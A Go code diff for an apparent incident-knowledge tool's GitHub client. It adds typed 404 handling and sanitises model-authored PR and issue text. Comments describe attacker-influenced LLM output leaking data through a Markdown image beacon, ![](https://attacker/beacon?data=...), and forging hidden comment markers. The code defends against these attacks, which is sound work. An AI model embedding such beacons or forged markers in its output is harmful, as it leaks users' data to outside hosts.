@@ -10,17 +10,18 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net/http"
 	"net/url"
-	"regexp"
 	"strings"
 	"time"
 
 	"github.com/Smana/runlore/internal/httpx"
 	"github.com/Smana/runlore/internal/okf"
 	"github.com/Smana/runlore/internal/providers"
+	"github.com/Smana/runlore/internal/redact"
 )
 
 // TokenFunc returns a valid installation token (minted/cached by the caller).
@@ -53,6 +54,21 @@ func New(baseURL, owner, repo, baseBranch string, token TokenFunc) *Client {
 }
 
 var _ providers.ReinvestForge = (*Client)(nil)
+
+// statusError is a non-2xx answer from do, kept typed so a caller can tell a 404
+// from a failure.
+type statusError struct {
+	code int
+	msg  string
+}
+
+func (e *statusError) Error() string { return e.msg }
+
+// isNotFound reports whether err is a 404 from do.
+func isNotFound(err error) bool {
+	var se *statusError
+	return errors.As(err, &se) && se.code == http.StatusNotFound
+}
 
 // do performs an authenticated JSON request and decodes the response into out (if non-nil).
 func (c *Client) do(ctx context.Context, method, path string, body, out any) error {
@@ -88,7 +104,7 @@ func (c *Client) do(ctx context.Context, method, path string, body, out any) err
 		// errors; httpx.SafeErrorBody strips the credential it was sent with and
 		// caps the length. Same reasoning (and the same helper) as the GitLab
 		// client — and the App installation token it launders is live for an hour.
-		return fmt.Errorf("github %s %s: status %d: %s", method, path, resp.StatusCode, httpx.SafeErrorBody(data, tok))
+		return &statusError{code: resp.StatusCode, msg: fmt.Sprintf("github %s %s: status %d: %s", method, path, resp.StatusCode, httpx.SafeErrorBody(data, tok))}
 	}
 	if out != nil {
 		return json.Unmarshal(data, out)
@@ -376,12 +392,16 @@ func (c *Client) IsPROpen(ctx context.Context, number int) (bool, error) {
 	return out.State == "open", nil
 }
 
-// ReplaceLabel removes one label and adds another (best-effort on the removal —
-// a 404 when the label isn't present is not fatal).
+// ReplaceLabel removes one label and adds another. With an add the removal is
+// best-effort, as it always was. With no add the removal is the whole call, so a
+// failure other than "the label is not there" (404) is returned: a caller that
+// removes ready-to-merge before a push must not push after a failed removal.
 func (c *Client) ReplaceLabel(ctx context.Context, number int, remove, add string) error {
 	if remove != "" {
-		// DELETE is best-effort: ignore "label not set" errors.
-		_ = c.do(ctx, http.MethodDelete, fmt.Sprintf("/repos/%s/%s/issues/%d/labels/%s", c.owner, c.repo, number, url.PathEscape(remove)), nil, nil)
+		err := c.do(ctx, http.MethodDelete, fmt.Sprintf("/repos/%s/%s/issues/%d/labels/%s", c.owner, c.repo, number, url.PathEscape(remove)), nil, nil)
+		if err != nil && add == "" && !isNotFound(err) {
+			return err
+		}
 	}
 	if add != "" {
 		return c.addLabels(ctx, number, []string{add})
@@ -393,28 +413,6 @@ func (c *Client) ReplaceLabel(ctx context.Context, number int, remove, add strin
 func (c *Client) Close(ctx context.Context, number int) error {
 	return c.do(ctx, http.MethodPatch, fmt.Sprintf("/repos/%s/%s/issues/%d", c.owner, c.repo, number),
 		map[string]any{"state": "closed"}, nil)
-}
-
-// imageRe matches Markdown image syntax: ![alt text](url). Alt text and URL
-// may be anything the model or alert pipeline wrote — an attacker-influenced
-// investigation body could carry ![](https://attacker/beacon?data=...) which
-// GitHub auto-fetches on render, leaking the KB URL and timing to a third party.
-var imageRe = regexp.MustCompile(`!\[([^\]]*)\]\([^)]*\)`)
-
-// neutralizeImages replaces every Markdown image in untrusted body text with a
-// non-fetching inline code span so the intent (there was an image reference) is
-// preserved for reviewers while GitHub never issues an outbound fetch. Applied
-// to all body text that reaches GitHub-rendered surfaces (issue body, PR body,
-// KB entry file body).
-func neutralizeImages(s string) string {
-	return imageRe.ReplaceAllStringFunc(s, func(m string) string {
-		// Extract the alt text (between ![ and ]) for the replacement label.
-		alt := imageRe.FindStringSubmatch(m)
-		if len(alt) < 2 || alt[1] == "" {
-			return "`[image]`"
-		}
-		return "`[image: " + alt[1] + "]`"
-	})
 }
 
 func issueTitle(inv providers.Investigation) string {
@@ -435,7 +433,7 @@ func issueBody(inv providers.Investigation) string {
 	}
 	// Neutralize image markdown before GitHub renders the body: an attacker-
 	// influenced investigation could carry ![](url) which GitHub auto-fetches.
-	return neutralizeImages(b.String())
+	return okf.NeutralizeImages(b.String())
 }
 
 // prBody is the GitHub PR description: a one-line why-keep summary so the PR list
@@ -447,18 +445,28 @@ func (c *Client) prBody(e providers.KBEntry) string {
 	if desc == "" {
 		desc = e.Title
 	}
+	// The description is model-authored: one line, so it cannot start a fake
+	// "**Evidence:**" line, and no comment delimiters, so it cannot carry a marker.
+	desc = stripCommentDelims(strings.Join(strings.Fields(desc), " "))
+	e = oneLineTitles(e)
 	body := fmt.Sprintf("Drafted by RunLore — %s\n\nReview the decision card + OKF entry in the changed file.", desc)
 	if s := c.suspectedDuplicateSection(e); s != "" {
-		body += "\n\n" + s
+		body += "\n\n" + stripCommentDelims(s)
 	}
 	if s := c.relatedSection(e); s != "" {
-		body += "\n\n" + s
+		body += "\n\n" + stripCommentDelims(s)
+	}
+	if e.Verdict != "" {
+		body += "\n\n" + providers.CardMarker(e.Verdict, e.Confidence)
+	}
+	if ev := cardEvidence(e.EvidenceLine); ev != "" {
+		body += "\n\n**Evidence:** " + ev
 	}
 	if m := providers.FingerprintMarker(e.Fingerprint); m != "" {
 		body += "\n\n" + m
 	}
 	// Neutralize image markdown in the untrusted description (LLM-authored).
-	return neutralizeImages(body)
+	return okf.NeutralizeImages(body)
 }
 
 // suspectedDuplicateSection renders the dedup decider's possible-duplicate flag
@@ -533,7 +541,7 @@ func (c *Client) blobURL(path string) string {
 // The body is neutralized here (LLM/alert-authored, GitHub auto-renders it);
 // okf.Render itself writes bodies verbatim.
 func renderEntry(e providers.KBEntry) string {
-	e.Body = neutralizeImages(e.Body)
+	e.Body = okf.NeutralizeImages(e.Body)
 	return okf.Render(e, okf.Meta{Timestamp: time.Now().UTC().Format(time.RFC3339)})
 }
 
@@ -556,3 +564,41 @@ func entryPath(e providers.KBEntry, slug string, now int64) string {
 }
 
 func slugify(s string) string { return okf.Slugify(s) }
+
+// cardEvidence makes the model-authored evidence line safe for the PR body: one
+// line, secrets redacted, no HTML comment delimiters (a copied marker could
+// pre-empt a real one), images neutralized by prBody.
+func cardEvidence(s string) string {
+	return stripCommentDelims(strings.Join(strings.Fields(redact.Secrets(s)), " "))
+}
+
+// stripCommentDelims removes HTML comment delimiters until none remain, so
+// untrusted text can neither forge a RunLore marker nor close one early.
+func stripCommentDelims(s string) string {
+	r := strings.NewReplacer("<!--", "", "-->", "")
+	for strings.Contains(s, "<!--") || strings.Contains(s, "-->") {
+		s = r.Replace(s)
+	}
+	return s
+}
+
+// oneLineTitles returns e with the neighbour titles collapsed to one line each,
+// so a model-written title cannot begin a line of its own in the PR body.
+func oneLineTitles(e providers.KBEntry) providers.KBEntry {
+	flat := func(r providers.RelatedEntry) providers.RelatedEntry {
+		r.Title = strings.Join(strings.Fields(r.Title), " ")
+		return r
+	}
+	if e.SuspectedDuplicate != nil {
+		d := flat(*e.SuspectedDuplicate)
+		e.SuspectedDuplicate = &d
+	}
+	if len(e.Related) > 0 {
+		rel := make([]providers.RelatedEntry, len(e.Related))
+		for i, r := range e.Related {
+			rel[i] = flat(r)
+		}
+		e.Related = rel
+	}
+	return e
+}
